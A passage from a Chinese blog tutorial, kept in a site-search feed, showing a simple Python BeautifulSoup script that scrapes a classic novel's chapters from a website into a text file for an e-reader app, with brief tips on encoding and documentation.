<h3 id="开始攻城"><a href="#开始攻城" class="headerlink" title="开始攻城"></a>开始攻城</h3><p>　　既然规律找到了那么接下来就好办了，这里还有一个问题，掌阅可以自动生成目录，其实是把你的txt文件中的第几回第几章等自动生成，所以文件里要有第几章所以加了一段转换代码生成”第几章”字样，贴一下代码。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request as u</span><br><span class="line">from bs4 import BeautifulSoup </span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'a.txt'</span>,<span class="string">'w+'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(22,111):</span><br><span class="line">	url=<span class="string">"http://www.saohua.com/shuku/xishuosuitang/ldf"</span>+str(i)+<span class="string">".htm"</span></span><br><span class="line">	res=u.urlopen(url)</span><br><span class="line">	html=res.read().decode(<span class="string">'gbk'</span>)</span><br><span class="line"></span><br><span class="line">	soup = BeautifulSoup(html,<span class="string">'lxml'</span>)</span><br><span class="line">	<span class="keyword">for</span> col <span class="keyword">in</span> range(2):</span><br><span class="line">		<span class="keyword">for</span> data <span class="keyword">in</span> soup.find_all(<span class="string">'font'</span>)[col]:</span><br><span class="line">			<span class="keyword">if</span>(data.string!=<span class="string">'HTMLBUILERPART0'</span> and data.string!=<span class="string">'/HTMLBUILERPART0'</span>):</span><br><span class="line">				<span class="keyword">if</span>(data.string==None):</span><br><span class="line">					f.write(<span class="string">'\n'</span>)</span><br><span class="line">				<span class="keyword">elif</span>(str(i-5) <span class="keyword">in</span> data.string):</span><br><span class="line">					f.write(<span class="string">'第'</span>+str(i-5)+<span class="string">'回:'</span>+data.string)</span><br><span class="line">				<span class="keyword">else</span>:	 </span><br><span class="line">					f.write(data.string)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></p>
<p>运行一下，大概三四秒钟…</p>
<pre><code class="lang-bash">C:\Users\xxx\Desktop&gt;python spider.py
</code></pre>
<h3 id="导入手机"><a href="#导入手机" class="headerlink" title="导入手机"></a>导入手机</h3><p>这部分大家应该都会吧，打开掌阅导入一下就可以看了。</p>
<h3 id="填坑总结"><a href="#填坑总结" class="headerlink" title="填坑总结"></a>填坑总结</h3><p>1.好好学英语吧，BeautifulSoup官方文档是靠着Google浏览器自动翻译的，研究了半天。<br>2.还有需要注意文字编码问题。<br>3.由于这个网站没有屏蔽爬虫，所以简单代码就可以。<br>4.{%raw%}{%endraw%}可以使输入的文本不被解析。</p>
]]></content>
      
        <categories>
            
            <category> 教程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Spider </tag>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
